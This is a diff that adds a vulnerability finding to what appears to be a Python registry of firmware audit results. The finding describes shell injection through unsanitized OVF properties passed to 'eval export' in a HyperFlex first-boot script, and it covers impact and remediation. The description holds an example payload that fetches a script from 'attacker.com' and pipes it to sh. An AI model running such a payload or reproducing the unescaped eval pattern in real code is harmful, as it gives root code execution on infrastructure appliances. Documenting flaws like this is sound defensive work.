@@ -12480,6 +12480,88 @@ HX_F222 = {
     "tags": ["sshpass", "credentials", "process-args", "cwe-214", "medium"],
 }
 
+HX_F226 = {
+    "id": "HX-F226",
+    "title": "Shell Injection via eval of Unsanitized OVF Environment Properties in First-Boot Script",
+    "severity": "MEDIUM",
+    "cvss_score": 6.7,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N",
+    "cwe": ["CWE-78"],
+    "component": (
+        "misc/usr/share/hyperflex/storfs-misc/firstboot.sh"
+    ),
+    "firmware_version": "HXDP 6.0.2b",
+    "description": (
+        "The HyperFlex installer appliance first-boot script (`firstboot.sh`) reads "
+        "the OVF environment from `guestinfo.ovfEnv` (via `vmtoolsd`) and passes "
+        "the parsed property key=value pairs to `eval export`. "
+        "The `getprops_from_ovfxml()` helper (lines 34-51) parses the OVF XML and "
+        "constructs shell assignments of the form `key=\"value\"`, escaping only "
+        "double-quote characters (`value.replace('\"', r'\\\"')`). "
+        "Backtick substitution, `$()` command substitution, semicolons, and other "
+        "shell metacharacters in property VALUES are not escaped and are executed "
+        "by the subsequent `eval export` at lines 83, 115, and 179. "
+        "The OVF environment (`guestinfo.ovfEnv`) is written by the VMware ESXi host "
+        "when deploying an OVF/OVA. An attacker with vSphere administrator access "
+        "can set a property value containing a command substitution (e.g., "
+        "`oe:value=\"$(curl http://attacker.com/shell.sh | sh)\"`) and the payload "
+        "executes as root during first boot. "
+        "The script runs as root; the injection point is the OVF environment "
+        "property value before any operator authentication to the appliance occurs."
+    ),
+    "evidence": [
+        {
+            "file": "misc/usr/share/hyperflex/storfs-misc/firstboot.sh",
+            "lines": "34-51",
+            "snippet": (
+                "function getprops_from_ovfxml() {\n"
+                "python3 - <<EOS\n"
+                "   for property in section.getElementsByTagName(\"Property\"):\n"
+                "      key = property.getAttribute(\"oe:key\").replace('.','_')\n"
+                "      value = property.getAttribute(\"oe:value\")\n"
+                "      value = value.replace('\"', r'\\\"')   # only escapes quotes\n"
+                "      print(\"{0}=\\\"{1}\\\"\".format(key,value))  # $() unescaped\n"
+                "EOS\n"
+                "}"
+            ),
+            "note": "Backticks, $(), ;, newlines in OVF property values are not sanitized",
+        },
+        {
+            "file": "misc/usr/share/hyperflex/storfs-misc/firstboot.sh",
+            "lines": "83, 115, 179",
+            "snippet": (
+                "eval export `getprops_from_ovfxml $OVFENV`  # line 83\n"
+                "eval export `getprops_from_ovfxml $OVFENV`  # line 115\n"
+                "eval export `getprops_from_ovfxml $OVFENV`  # line 179"
+            ),
+            "note": (
+                "Three separate eval sites; all execute as root; line 179 is "
+                "inside the password-setting function where the OVF root password "
+                "property is consumed"
+            ),
+        },
+    ],
+    "impact": (
+        "An attacker with VMware vSphere administrator access who can modify "
+        "`guestinfo.ovfEnv` for the HyperFlex installer appliance VM (before or "
+        "during deployment) achieves root code execution on the appliance. "
+        "The appliance holds cluster credentials, acts as the bootstrap node "
+        "for cluster enrollment, and has network access to all HyperFlex nodes. "
+        "Exploitation occurs before any HyperFlex-level authentication: "
+        "the injection runs during OS first-boot, prior to operator login."
+    ),
+    "remediation": (
+        "1. Replace `eval export` with individual `export VAR=value` statements "
+        "using Python-level output quoting that is shell-safe "
+        "(e.g., `shlex.quote()` for each value). "
+        "2. Alternatively, write parsed OVF properties to a JSON or "
+        "properties file and read them in Python rather than exporting to shell. "
+        "3. Apply a strict allowlist of expected property keys and value character "
+        "sets before the eval; reject any value containing shell metacharacters."
+    ),
+    "tags": ["shell-injection", "eval", "ovf", "firstboot", "cwe-78", "medium"],
+}
+
 HX_F225 = {
     "id": "HX-F225",
     "title": "Hardcoded ESXi Root Credential 'springpath' as Default in Deployment Script and Test Config File",
@@ -12788,7 +12870,7 @@ for _f in [
     HX_F219, HX_F220,
     HX_F221, HX_F222,
     HX_F223, HX_F224,
-    HX_F225,
+    HX_F225, HX_F226,
 ]:
     FINDINGS[_f["id"]] = _f
 
